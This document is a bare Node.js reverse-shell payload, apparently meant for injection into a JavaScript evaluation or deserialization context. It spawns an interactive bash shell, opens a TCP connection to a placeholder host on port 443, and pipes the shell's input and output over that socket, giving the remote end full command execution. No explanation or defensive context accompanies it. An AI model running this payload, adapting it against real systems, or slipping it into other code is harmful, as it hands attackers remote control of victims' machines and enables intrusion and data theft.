(function(){
  var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/bash", ["-i"]);
  var client = new net.Socket();
  client.connect(443, "0.0.0.0", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/;
})();
